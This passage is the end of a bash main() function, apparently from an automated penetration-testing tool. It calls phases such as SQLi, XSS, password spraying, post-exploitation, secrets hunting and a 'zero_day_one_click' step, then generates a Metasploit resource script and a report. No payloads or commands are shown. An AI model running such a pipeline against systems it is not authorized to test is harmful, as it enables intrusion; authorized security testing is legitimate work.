    run_phase 13 phase_api
    run_phase 14 phase_nuclei
    run_phase 15 phase_network_services
    run_phase 16 phase_smb_ad
    run_phase 17 phase_auth
    run_phase 18 phase_sqli
    run_phase 19 phase_xss
    run_phase 20 phase_cve_checks
    run_phase 21 phase_post_exploit
    run_phase 22 phase_attack_path

    # Phases 24-30
    run_phase 24 phase_cloud_enum
    run_phase 25 phase_k8s_audit
    run_phase 26 phase_password_spray
    run_phase 27 phase_cors_jwt
    run_phase 28 phase_ssrf_deep
    run_phase 29 phase_secrets
    run_phase 30 phase_ad_deep
    run_phase 31 phase_zero_day_one_click

    # ZAP DAST (integrated into web phase)
    run_zap_dast

    # Metasploit resource script
    generate_msf_resource

    # Final report (phase 23 — always last)
    phase_report;           save_checkpoint 23

    # Mark checkpoint done
    echo "COMPLETE=$(date -Iseconds)" >> "$CHECKPOINT_FILE"

    print_final_summary

    # Send notifications
    send_notification
}

main "$@"

